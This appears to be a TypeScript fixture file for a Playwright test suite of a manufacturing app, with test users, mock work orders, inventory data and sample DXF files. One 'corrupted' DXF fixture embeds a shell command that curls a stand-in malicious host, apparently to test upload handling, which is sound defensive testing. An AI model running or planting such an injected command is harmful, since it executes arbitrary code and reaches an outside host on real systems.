/**
 * Test data fixtures for ForgeIQ End-to-End Playwright test suite.
 */

export const TEST_USERS = {
  customer: {
    email: 'rvance@apexaero.com',
    password: 'Password123!',
    company: 'Apex Aerospace Solutions',
    name: 'Robert Vance',
    role: 'Customer',
  },
  manager: {
    email: 'manager@forgeiq.com',
    password: 'Password123!',
    company: 'Acme Precision Metals',
    name: 'Marcus Sterling',
    role: 'Manager',
  },
  owner: {
    email: 'owner@forgeiq.com',
    password: 'Password123!',
    company: 'ForgeIQ Industries',
    name: 'Elena Rostova',
    role: 'Owner',
  },
};

export const MOCK_WORK_ORDERS = [
  {
    orderNumber: 'FG-2042',
    title: 'Titanium Flange Assembly (Revision B)',
    customerName: 'Apex Aerospace Solutions',
    status: 'In Production',
    priority: 'Rush',
    totalAmount: 48500,
    dueDate: '2026-09-20',
  },
  {
    orderNumber: 'FG-2041',
    title: 'Precision Server Rack Chassis Enclosures',
    customerName: 'Titan Heavy Machinery Ltd',
    status: 'Pending Approval',
    priority: 'High',
    totalAmount: 18450,
    dueDate: '2026-09-25',
  },
];

export const OUT_OF_STOCK_MATERIAL = {
  sku: 'INVAR-36-05',
  name: 'Invar-36 Low Expansion Alloy Sheet (0.5mm)',
  category: 'Specialty Alloys',
  materialGrade: 'Invar 36 (FeNi36)',
  quantity: 0,
  unit: 'Sheets',
  reorderPoint: 15,
  reorderDate: '2026-09-15',
  unitCost: 14500,
  location: 'Bay D-04',
};

export const SAMPLE_CAD_FILES = {
  cleanDxf: {
    name: 'bracket_drawing.dxf',
    mimeType: 'application/dxf',
    content: `0
SECTION
2
HEADER
9
$ACADVER
1
AC1027
0
ENDSEC
0
SECTION
2
ENTITIES
0
LINE
8
OUTLINE
10
0.0
20
0.0
11
150.0
21
0.0
0
LINE
8
OUTLINE
10
150.0
20
0.0
11
150.0
21
100.0
0
CIRCLE
8
HOLES
10
50.0
20
50.0
40
8.0
0
ENDSEC
0
EOF`,
  },
  corruptedDxf: {
    name: 'corrupted_payload.dxf',
    mimeType: 'application/dxf',
    content: `0\nSECTION\n(command "SHELL" "curl http://malicious.internal")\n0\nEOF`,
  },
};
